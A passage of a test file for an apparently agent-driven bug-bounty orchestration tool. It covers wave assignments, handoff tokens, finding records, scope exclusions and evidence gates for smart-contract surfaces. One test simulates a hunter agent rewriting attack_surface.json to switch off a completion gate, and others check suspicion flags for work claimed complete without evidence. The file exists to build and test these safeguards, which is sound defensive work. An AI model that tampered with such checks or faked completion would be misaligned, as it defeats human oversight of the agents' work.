      { agent: "a2", surface_id: "surface-b" },
    ]);
    seedAttackSurface(domain, ["surface-a", "surface-b", "surface-c", "surface-d"]);

    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "A1 complete.",
      content: "# A1",
      dead_ends: ["/new-dead-end"],
      lead_surface_ids: ["surface-a", "surface-c"],
    });
    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a2",
      surface_id: "surface-b",
      surface_status: "partial",
      summary: "A2 partial.",
      content: "# A2",
      waf_blocked_endpoints: ["/new-waf"],
      lead_surface_ids: ["surface-d", "surface-x"],
    });

    seedFinding(domain, { wave: "w1", agent: "a1", severity: "high" });
    seedFinding(domain, {
      wave: "w1",
      agent: "a2",
      title: "Verbose stack trace leak",
      severity: "low",
      endpoint: "/boom",
      description: "Exception page leaks internal paths.",
      proof_of_concept: "curl https://example.com/boom",
      response_evidence: "ReferenceError",
      impact: "Improves exploit development.",
    });

    fs.writeFileSync(path.join(sessionDir(domain), "scope-warnings.log"), [
      "[2026-01-01T00:00:00Z] OUT-OF-SCOPE: OOS.example.net (command: curl https://OOS.example.net)",
      "[2026-01-01T00:00:01Z] OUT-OF-SCOPE (http_scan): api.other.example (url: https://api.other.example/admin)",
    ].join("\n"));

    const result = JSON.parse(applyWaveMerge({
      target_domain: domain,
      wave_number: 1,
      force_merge: false,
    }));

    assert.deepEqual(result.readiness, {
      assignments_total: 2,
      handoffs_total: 2,
      received_agents: ["a1", "a2"],
      missing_agents: [],
      unexpected_agents: [],
      is_complete: true,
    });
    assert.deepEqual(result.merge, {
      received_agents: ["a1", "a2"],
      invalid_agents: [],
      unexpected_agents: [],
      completed_surface_ids: ["surface-a"],
      partial_surface_ids: ["surface-b"],
      missing_surface_ids: [],
      requeue_surface_ids: ["surface-b"],
      new_dead_ends_count: 1,
      new_waf_blocked_count: 1,
      lead_surface_ids: ["surface-a", "surface-c", "surface-d", "surface-x"],
      blocked_harness_runs: [],
      blocked_harness_runs_grouped: [],
      bypass_attempts: [],
      bypass_attempts_grouped: [],
      suspicion_flags: [],
      provenance: {
        verified_agents: [],
        legacy_unverified_agents: ["a1", "a2"],
      },
    });
    assert.deepEqual(result.findings, {
      total: 2,
      by_severity: { critical: 0, high: 1, medium: 0, low: 1, info: 0 },
      has_high_or_critical: true,
    });
    // compact state returns counts, not arrays — verify via full state read
    assert.equal(result.state.explored_count, 1);
    assert.equal(result.state.dead_ends_count, 2);
    assert.equal(result.state.waf_blocked_count, 2);
    assert.deepEqual(result.state.lead_surface_ids, ["surface-c", "surface-d"]);
    assert.equal(result.state.pending_wave, null);
    assert.equal(result.state.hunt_wave, 1);
    assert.equal(result.state.total_findings, 2);
    // verify full state on disk has the arrays
    const fullState = JSON.parse(readSessionState({ target_domain: domain })).state;
    assert.deepEqual(fullState.explored, ["surface-a"]);
    assert.deepEqual(fullState.dead_ends, ["/existing", "/new-dead-end"]);
    assert.deepEqual(fullState.waf_blocked_endpoints, ["/old-waf", "/new-waf"]);
    assert.deepEqual(fullState.scope_exclusions, ["oos.example.net", "api.other.example"]);
    assert.deepEqual(readScopeExclusions(domain), ["oos.example.net", "api.other.example"]);
  });
});

test("bounty_apply_wave_merge requeues unfinished coverage without treating tested or blocked as unfinished", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", pending_wave: 1 });
    seedAssignments(domain, 1, [
      { agent: "a1", surface_id: "surface-a" },
      { agent: "a2", surface_id: "surface-b" },
      { agent: "a3", surface_id: "surface-c" },
      { agent: "a4", surface_id: "surface-d" },
      { agent: "a5", surface_id: "surface-e" },
    ]);
    seedAttackSurface(domain, ["surface-a", "surface-b", "surface-c", "surface-d", "surface-e"]);

    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      entries: [{
        endpoint: "/api/v1/export",
        method: "GET",
        bug_class: "idor",
        auth_profile: "attacker-victim",
        status: "promising",
        evidence_summary: "victim replay changed response size",
        next_step: "test CSV export variant",
      }],
    });
    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a2",
      surface_id: "surface-b",
      entries: [
        {
          endpoint: "/api/v1/users/123",
          method: "GET",
          bug_class: "idor",
          status: "promising",
          evidence_summary: "initial IDOR suspicion",
        },
        {
          endpoint: "/api/v1/users/123",
          method: "GET",
          bug_class: "idor",
          status: "tested",
          evidence_summary: "latest replay returned 403 for attacker and victim",
        },
      ],
    });
    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a3",
      surface_id: "surface-c",
      entries: [{
        endpoint: "/search",
        method: "POST",
        bug_class: "xss",
        status: "blocked",
        evidence_summary: "WAF blocks reflected payloads",
      }],
    });
    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a4",
      surface_id: "surface-d",
      entries: [{
        endpoint: "/billing/refunds",
        method: "POST",
        bug_class: "business_logic",
        status: "needs_auth",
        evidence_summary: "refund path requires a victim billing role",
        next_step: "retry after victim billing profile exists",
      }],
    });
    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a5",
      surface_id: "surface-e",
      entries: [{
        endpoint: "/api/v2/admin/export",
        method: "GET",
        bug_class: "authz",
        status: "requeue",
        evidence_summary: "admin export route discovered late in the wave",
        next_step: "test admin role boundaries",
      }],
    });

    for (const [agent, surfaceId] of [
      ["a1", "surface-a"],
      ["a2", "surface-b"],
      ["a3", "surface-c"],
      ["a4", "surface-d"],
      ["a5", "surface-e"],
    ]) {
      writeWaveHandoff({
        target_domain: domain,
        wave: "w1",
        agent,
        surface_id: surfaceId,
        surface_status: "complete",
        summary: `${agent} complete.`,
        content: `# ${agent}`,
      });
    }

    const result = JSON.parse(applyWaveMerge({
      target_domain: domain,
      wave_number: 1,
      force_merge: false,
    }));

    assert.deepEqual(result.merge.completed_surface_ids, ["surface-a", "surface-b", "surface-c", "surface-d", "surface-e"]);
    assert.deepEqual(result.merge.partial_surface_ids, []);
    assert.deepEqual(result.merge.requeue_surface_ids, ["surface-a", "surface-d", "surface-e"]);

    const fullState = JSON.parse(readSessionState({ target_domain: domain })).state;
    assert.deepEqual(fullState.explored, ["surface-b", "surface-c"]);
  });
});

test("bounty_apply_wave_merge preserves existing scope exclusions when the log is absent", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, {
      phase: "HUNT",
      pending_wave: 1,
      scope_exclusions: ["legacy.example"],
    });
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    seedAttackSurface(domain, ["surface-a"]);
    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "A1 complete.",
      content: "# A1",
    });

    const result = JSON.parse(applyWaveMerge({
      target_domain: domain,
      wave_number: 1,
      force_merge: false,
    }));

    // compact state doesn't include scope_exclusions — verify via full state read
    const fullState = JSON.parse(readSessionState({ target_domain: domain })).state;
    assert.deepEqual(fullState.scope_exclusions, ["legacy.example"]);
  });
});

test("bounty_apply_wave_merge force-merges missing and invalid handoffs and computes requeue_surface_ids", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", pending_wave: 2, hunt_wave: 1 });
    seedAssignments(domain, 2, [
      { agent: "a1", surface_id: "surface-a" },
      { agent: "a2", surface_id: "surface-b" },
      { agent: "a3", surface_id: "surface-c" },
    ]);
    seedAttackSurface(domain, ["surface-a", "surface-b", "surface-c"]);

    writeFileAtomic(path.join(sessionDir(domain), "handoff-w2-a1.json"), "{bad json");
    writeWaveHandoff({
      target_domain: domain,
      wave: "w2",
      agent: "a3",
      surface_id: "surface-c",
      surface_status: "partial",
      summary: "A3 partial.",
      content: "# A3",
    });

    const result = JSON.parse(applyWaveMerge({
      target_domain: domain,
      wave_number: 2,
      force_merge: true,
    }));

    assert.equal(result.status, "merged");
    assert.equal(result.force_merge, true);
    assert.deepEqual(result.merge.invalid_agents, ["a1"]);
    assert.deepEqual(result.merge.missing_surface_ids, ["surface-b"]);
    assert.deepEqual(result.merge.partial_surface_ids, ["surface-c"]);
    assert.deepEqual(result.merge.requeue_surface_ids, ["surface-c", "surface-b", "surface-a"]);
    assert.equal(result.state.pending_wave, null);
    assert.equal(result.state.hunt_wave, 2);
  });
});

test("bounty_apply_wave_merge rejects invalid state invariants and hard-fails on missing or malformed attack_surface.json", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "CHAIN", pending_wave: 1 });
    assert.throws(
      () => applyWaveMerge({ target_domain: domain, wave_number: 1, force_merge: false }),
      /Wave merge requires phase HUNT or EXPLORE/,
    );

    seedSessionState(domain, { phase: "HUNT", pending_wave: 1 });
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "A1 complete.",
      content: "# A1",
    });

    // seedAssignments mirrors the production invariant by auto-seeding
    // attack_surface.json. Remove it to exercise the missing-file path.
    fs.rmSync(attackSurfacePath(domain), { force: true });
    assert.throws(
      () => applyWaveMerge({ target_domain: domain, wave_number: 1, force_merge: false }),
      /Missing attack surface JSON:/,
    );

    writeFileAtomic(attackSurfacePath(domain), "{bad json");
    assert.throws(
      () => applyWaveMerge({ target_domain: domain, wave_number: 1, force_merge: false }),
      /Malformed attack surface JSON:/,
    );
  });
});

test("bounty_write_wave_handoff rejects unassigned or mismatched handoffs", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);

    assert.throws(
      () => writeWaveHandoff({
        target_domain: domain,
        wave: "w1",
        agent: "a2",
        surface_id: "surface-b",
        surface_status: "complete",
        summary: "Invalid agent handoff.",
        content: "# nope",
      }),
      /Agent a2 is not assigned in wave w1/,
    );

    assert.throws(
      () => writeWaveHandoff({
        target_domain: domain,
        wave: "w1",
        agent: "a1",
        surface_id: "surface-b",
        surface_status: "complete",
        summary: "Mismatched surface handoff.",
        content: "# nope",
      }),
      /Agent a1 is assigned surface surface-a, not surface-b/,
    );
  });
});

test("bounty_record_finding rejects partial or invalid wave metadata and still allows null/null", () => {
  withTempHome(() => {
    const domain = "example.com";

    assert.throws(
      () => recordFinding({
        target_domain: domain,
        title: "A",
        severity: "high",
        endpoint: "/a",
        description: "d",
        proof_of_concept: "poc",
        validated: true,
        wave: "w1",
      }),
      /wave and agent must either both be provided or both be omitted/,
    );

    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    assert.throws(
      () => recordFinding({
        target_domain: domain,
        title: "A",
        severity: "high",
        endpoint: "/a",
        description: "d",
        proof_of_concept: "poc",
        validated: true,
        wave: "w1",
        agent: "a1",
      }),
      /surface_id must be a non-empty string/,
    );
    assert.throws(
      () => recordFinding({
        target_domain: domain,
        title: "A",
        severity: "high",
        endpoint: "/a",
        description: "d",
        proof_of_concept: "poc",
        validated: true,
        wave: "w1",
        agent: "a2",
        surface_id: "surface-a",
      }),
      /Agent a2 is not assigned in wave w1/,
    );

    const recorded = JSON.parse(recordFinding({
      target_domain: domain,
      title: "Unscoped finding",
      severity: "low",
      endpoint: "/b",
      description: "d",
      proof_of_concept: "poc",
      validated: true,
      wave: null,
      agent: null,
    }));
    assert.equal(recorded.recorded, true);

    const finding = JSON.parse(fs.readFileSync(findingsJsonlPath(domain), "utf8").trim());
    assert.equal(finding.wave, null);
    assert.equal(finding.agent, null);
    assert.equal(finding.surface_id, null);
    assert.equal(finding.auth_profile, null);
  });
});

test("bounty_write_handoff still writes SESSION_HANDOFF.md without wave fields", () => {
  withTempHome(() => {
    const domain = "example.com";
    const result = JSON.parse(writeHandoff({
      target_domain: domain,
      session_number: 7,
      target_url: "https://example.com",
      explored_with_results: ["surface-a"],
      must_do_next: [{ priority: "P1", description: "Keep testing surface-a" }],
    }));

    const handoffPath = path.join(sessionDir(domain), "SESSION_HANDOFF.md");
    assert.equal(result.written, handoffPath);
    assert.ok(fs.existsSync(handoffPath));

    const content = fs.readFileSync(handoffPath, "utf8");
    assert.match(content, /# Handoff — Session 7/);
    assert.match(content, /## Explored/);
    assert.doesNotMatch(content, /handoff-w7-a1/);
  });
});

test("bounty_write_wave_handoff writes matching markdown and json with normalized defaults", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    const content = "# Handoff\n\nFreeform markdown.";
    const result = JSON.parse(writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "Freeform handoff summary.",
      content,
    }));

    assert.ok(fs.existsSync(result.written_md));
    assert.ok(fs.existsSync(result.written_json));
    assert.equal(fs.readFileSync(result.written_md, "utf8"), content);

    const payload = JSON.parse(fs.readFileSync(result.written_json, "utf8"));
    assert.deepEqual(payload, {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_type: null,
      surface_status: "complete",
      provenance: "legacy_unverified",
      summary: "Freeform handoff summary.",
      chain_notes: [],
      blocked_harness_runs: [],
      bypass_attempts: [],
      dead_ends: [],
      waf_blocked_endpoints: [],
      lead_surface_ids: [],
    });
  });
});

test("bounty_write_wave_handoff rejects surface_status: complete with blocked_harness_runs", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    assert.throws(() => writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "Tried but blocked.",
      content: "# Handoff\n",
      blocked_harness_runs: [
        { kind: "foundry_fork", harness: "foundry-fork-mainnet", reason: "RPC timeout at block 19000000", needed_for: "PSM donation invariant" },
      ],
    }), /surface_status cannot be 'complete' when blocked_harness_runs is non-empty/);
  });
});

test("bounty_write_wave_handoff accepts surface_status: partial with blocked_harness_runs", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    const result = JSON.parse(writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "partial",
      summary: "Blocked harnesses recorded.",
      content: "# Handoff\n",
      blocked_harness_runs: [
        { kind: "foundry_fork", harness: "foundry-fork-mainnet", reason: "RPC timeout at block 19000000", needed_for: "PSM donation invariant" },
      ],
    }));
    const payload = JSON.parse(fs.readFileSync(result.written_json, "utf8"));
    assert.equal(payload.surface_status, "partial");
    assert.equal(payload.blocked_harness_runs.length, 1);
    assert.equal(payload.blocked_harness_runs[0].kind, "foundry_fork");
    assert.equal(payload.blocked_harness_runs[0].harness, "foundry-fork-mainnet");
    assert.equal(payload.blocked_harness_runs[0].needed_for, "PSM donation invariant");
  });
});

test("bounty_write_wave_handoff rejects smart_contract complete without findings or bypass_attempts", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    assert.throws(() => writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "Audit confirms fixed; nothing to test.",
      content: "# Handoff\n",
    }), /smart_contract surfaces cannot be marked 'complete' without evidence of attempted invariant breaks/);
  });
});

test("bounty_write_wave_handoff accepts smart_contract complete with bypass_attempts entry", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    const result = JSON.parse(writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "Tested admin bypass; no finding.",
      content: "# Handoff\n",
      bypass_attempts: [
        {
          condition: "admin_eoa_compromise",
          attempt_summary: "Forge test calls admin function from a non-admin EOA. Reverts with 'caller is not admin'. Tested from forked mainnet.",
          outcome: "no_finding",
        },
      ],
    }));
    const payload = JSON.parse(fs.readFileSync(result.written_json, "utf8"));
    assert.equal(payload.surface_status, "complete");
    assert.equal(payload.surface_type, "smart_contract");
    assert.equal(payload.bypass_attempts.length, 1);
    assert.equal(payload.bypass_attempts[0].condition, "admin_eoa_compromise");
    assert.equal(payload.bypass_attempts[0].outcome, "no_finding");
  });
});

test("bounty_write_wave_handoff accepts smart_contract complete when a finding is recorded for the surface", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    seedFinding(domain, {
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      sc_evidence: {
        chain_id: 1,
        contract_address: "0x" + "11".repeat(20),
        harness_path: os.homedir(),
        match_test: "test_reentrancy_drain",
        fork_block: 19_000_000,
      },
    });
    const result = JSON.parse(writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "Found and recorded a critical reentrancy bug.",
      content: "# Handoff\n",
    }));
    const payload = JSON.parse(fs.readFileSync(result.written_json, "utf8"));
    assert.equal(payload.surface_status, "complete");
    assert.equal(payload.surface_type, "smart_contract");
  });
});

test("bounty_write_wave_handoff requires finding_id when bypass_attempts.outcome is finding_recorded", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    assert.throws(() => writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "partial",
      summary: "Forgot finding_id.",
      content: "# Handoff\n",
      bypass_attempts: [
        {
          condition: "oracle_manipulation",
          attempt_summary: "Forge test attempts to flash-loan-manipulate the TWAP cache to a stale price; observed the read still passes through.",
          outcome: "finding_recorded",
        },
      ],
    }), /finding_id is required when outcome is "finding_recorded"/);
  });
});

test("bounty_write_wave_handoff allows non-smart_contract surfaces to complete without bypass_attempts", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "api" }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    const result = JSON.parse(writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "API surface tested with no findings.",
      content: "# Handoff\n",
    }));
    const payload = JSON.parse(fs.readFileSync(result.written_json, "utf8"));
    assert.equal(payload.surface_status, "complete");
    assert.equal(payload.surface_type, "api");
    assert.deepEqual(payload.bypass_attempts, []);
  });
});

test("smart_contract gate ignores agent-mutated attack_surface.json (assignment is the authority)", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);

    // Simulate a hunter that mutates attack_surface.json after assignments are written,
    // downgrading the surface from smart_contract -> api in an attempt to disable the gate.
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "api" }]);

    // The gate must still fire because surface_type was captured into the
    // immutable assignment at start_wave (here, seedAssignments) time.
    assert.throws(() => writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "Tampered with attack_surface.json; expected to bypass gate.",
      content: "# Handoff\n",
    }), /smart_contract surfaces cannot be marked 'complete' without evidence of attempted invariant breaks/);
  });
});

test("merge re-derives smart_contract surface_type even when stored handoff caches null", () => {
  withTempHome(() => {
    const domain = "example.com";
    // Surface marked smart_contract in attack_surface.json from the start.
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" }]);
    seedSessionState(domain, { phase: "HUNT", pending_wave: 1 });
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);

    // Simulate a handoff written when the attack_surface lookup had failed (cached surface_type: null)
    // by manually crafting the stored payload. The merge must re-derive and reject.
    const dir = sessionDir(domain);
    fs.mkdirSync(dir, { recursive: true });
    writeFileAtomic(path.join(dir, "handoff-w1-a1.json"), `${JSON.stringify({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_type: null,
      surface_status: "complete",
      provenance: "legacy_unverified",
      summary: "Audit confirms fixed.",
      chain_notes: [],
      blocked_harness_runs: [],
      bypass_attempts: [],
      dead_ends: [],
      waf_blocked_endpoints: [],
      lead_surface_ids: [],
    }, null, 2)}\n`);

    const merged = JSON.parse(mergeWaveHandoffs({ target_domain: domain, wave_number: 1 }));
    // Stored null is overridden by attack_surface.json re-derive: SC gate fires,
    // handoff is rejected at merge as invalid (no findings, no bypass_attempts).
    assert.deepEqual(merged.invalid_agents, ["a1"]);
    assert.deepEqual(merged.completed_surface_ids, []);
  });
});

test("merge emits sc_complete_with_zero_evidence suspicion flag when all bypass_attempts are no_finding", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" }]);
    seedSessionState(domain, { phase: "HUNT", pending_wave: 1 });
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "Tested several conditions, no finding.",
      content: "# Handoff\n",
      bypass_attempts: [
        { condition: "admin_eoa_compromise", attempt_summary: "Forge test calls admin function from a non-admin EOA. Reverts as expected.", outcome: "no_finding" },
        { condition: "oracle_staleness", attempt_summary: "Forge test pushes time forward 30 minutes; price oracle returns stale read but the consumer rejects.", outcome: "no_finding" },
      ],
    });
    const merged = JSON.parse(mergeWaveHandoffs({ target_domain: domain, wave_number: 1 }));
    assert.equal(merged.suspicion_flags.length, 1);
    assert.equal(merged.suspicion_flags[0].flag, "sc_complete_with_zero_evidence");
    assert.equal(merged.suspicion_flags[0].surface_id, "surface-a");
  });
});

test("merge groups blocked_harness_runs and bypass_attempts by (kind, harness) and (condition, outcome)", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [
      { id: "surface-a", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" },
      { id: "surface-b", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" },
    ]);
    seedSessionState(domain, { phase: "HUNT", pending_wave: 1 });
    seedAssignments(domain, 1, [
      { agent: "a1", surface_id: "surface-a" },
      { agent: "a2", surface_id: "surface-b" },
    ]);
    const sharedAttempt = { condition: "admin_eoa_compromise", attempt_summary: "Forge test calls admin function from a non-admin EOA. Reverts with caller is not admin.", outcome: "no_finding" };
    writeWaveHandoff({
      target_domain: domain, wave: "w1", agent: "a1", surface_id: "surface-a",
      surface_status: "partial", summary: "RPC down.", content: "# A1",
      blocked_harness_runs: [{ kind: "foundry_fork", harness: "foundry-fork-mainnet", reason: "RPC timeout" }],
      bypass_attempts: [sharedAttempt],
    });
    writeWaveHandoff({
      target_domain: domain, wave: "w1", agent: "a2", surface_id: "surface-b",
      surface_status: "partial", summary: "RPC down too.", content: "# A2",
      blocked_harness_runs: [{ kind: "foundry_fork", harness: "foundry-fork-mainnet", reason: "RPC timeout again" }],
      bypass_attempts: [sharedAttempt],
    });
    const merged = JSON.parse(mergeWaveHandoffs({ target_domain: domain, wave_number: 1 }));
    assert.equal(merged.blocked_harness_runs_grouped.length, 1);
    assert.equal(merged.blocked_harness_runs_grouped[0].kind, "foundry_fork");
    assert.equal(merged.blocked_harness_runs_grouped[0].harness, "foundry-fork-mainnet");
    assert.equal(merged.blocked_harness_runs_grouped[0].count, 2);
    assert.deepEqual(merged.blocked_harness_runs_grouped[0].agents, ["a1", "a2"]);
    assert.deepEqual(merged.blocked_harness_runs_grouped[0].surface_ids, ["surface-a", "surface-b"]);
    assert.equal(merged.bypass_attempts_grouped.length, 1);
    assert.equal(merged.bypass_attempts_grouped[0].condition, "admin_eoa_compromise");
    assert.equal(merged.bypass_attempts_grouped[0].outcome, "no_finding");
    assert.equal(merged.bypass_attempts_grouped[0].count, 2);
  });
});

test("bypass_attempts enforces minimum length floors", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    assert.throws(() => writeWaveHandoff({
      target_domain: domain, wave: "w1", agent: "a1", surface_id: "surface-a",
      surface_status: "partial", summary: "Lazy.", content: "# Handoff\n",
      bypass_attempts: [{ condition: "x", attempt_summary: "x", outcome: "no_finding" }],
    }), /condition must be at least 4 characters/);
    assert.throws(() => writeWaveHandoff({
      target_domain: domain, wave: "w1", agent: "a1", surface_id: "surface-a",
      surface_status: "partial", summary: "Lazy.", content: "# Handoff\n",
      bypass_attempts: [{ condition: "admin", attempt_summary: "short", outcome: "no_finding" }],
    }), /attempt_summary must be at least 30 characters/);
  });
});

test("bypass_attempts.finding_id existence is cross-checked against findings.jsonl when supplied", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAttackSurfaces(domain, [{ id: "surface-a", hosts: [`https://${domain}`], surface_type: "smart_contract", chain_family: "evm" }]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    assert.throws(() => writeWaveHandoff({
      target_domain: domain, wave: "w1", agent: "a1", surface_id: "surface-a",
      surface_status: "partial", summary: "References nonexistent finding.", content: "# Handoff\n",
      bypass_attempts: [{
        condition: "admin_eoa_compromise",
        attempt_summary: "Forge test attempted to call admin function with a non-admin EOA and observed revert.",
        outcome: "finding_recorded",
        finding_id: "F-9999",
      }],
    }), /F-9999 does not match any recorded finding for this run/);
  });
});

test("tokenized wave handoffs require the correct token and report verified provenance", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 0 });
    seedAttackSurface(domain, ["surface-a"]);

    const started = await executeTool("bounty_start_wave", {
      target_domain: domain,
      wave_number: 1,
      assignments: [{ agent: "a1", surface_id: "surface-a" }],
    });
    assert.equal(started.ok, true);
    const token = started.data.assignments[0].handoff_token;
    const assignmentText = fs.readFileSync(path.join(sessionDir(domain), "wave-1-assignments.json"), "utf8");
    assert.doesNotMatch(assignmentText, new RegExp(token));
    assert.match(assignmentText, /handoff_token_sha256/);

    const missing = await executeTool("bounty_write_wave_handoff", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "Tested the assigned surface.",
      content: "# handoff",
    });
    assert.equal(missing.ok, false);
    assert.equal(missing.error.code, "INVALID_ARGUMENTS");
    assert.match(missing.error.message, /handoff_token is required/);

    const wrong = await executeTool("bounty_write_wave_handoff", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      handoff_token: "wrong-token-value",
      summary: "Tested the assigned surface.",
      content: "# handoff",
    });
    assert.equal(wrong.ok, false);
    assert.equal(wrong.error.code, "INVALID_ARGUMENTS");
    assert.match(wrong.error.message, /handoff_token does not match/);

    const written = await executeTool("bounty_write_wave_handoff", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      handoff_token: token,
      summary: "Tested the assigned surface.",
      chain_notes: ["No chainable primitive found."],
      content: "# handoff",
    });
    assert.equal(written.ok, true);
    assert.equal(written.data.provenance, "verified");

    const handoffs = await executeTool("bounty_read_wave_handoffs", {
      target_domain: domain,
      wave_number: 1,
    });
    assert.equal(handoffs.ok, true);
    assert.equal(handoffs.data.handoffs[0].provenance, "verified");
    assert.equal(handoffs.data.handoffs[0].summary, "Tested the assigned surface.");
    assert.deepEqual(handoffs.data.handoffs[0].chain_notes, ["No chainable primitive found."]);

    const merged = await executeTool("bounty_apply_wave_merge", {
      target_domain: domain,
      wave_number: 1,
      force_merge: false,
    });
    assert.equal(merged.ok, true);
    assert.equal(merged.data.status, "merged");
    assert.deepEqual(merged.data.merge.provenance, {
      verified_agents: ["a1"],
      legacy_unverified_agents: [],
    });
  });
});

test("bounty_finalize_hunter_run blocks missing invalid and mismatched handoffs", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);

    const missing = await executeTool("bounty_finalize_hunter_run", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
    });
    assert.equal(missing.ok, false);
    assert.equal(missing.error.code, "STATE_CONFLICT");
    assert.equal(missing.error.details.block_code, "missing_handoff");
    assert.equal(missing.error.details.handoff.present, false);

    writeFileAtomic(path.join(sessionDir(domain), "handoff-w1-a1.json"), "{bad json");
    const invalid = await executeTool("bounty_finalize_hunter_run", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
    });
    assert.equal(invalid.ok, false);
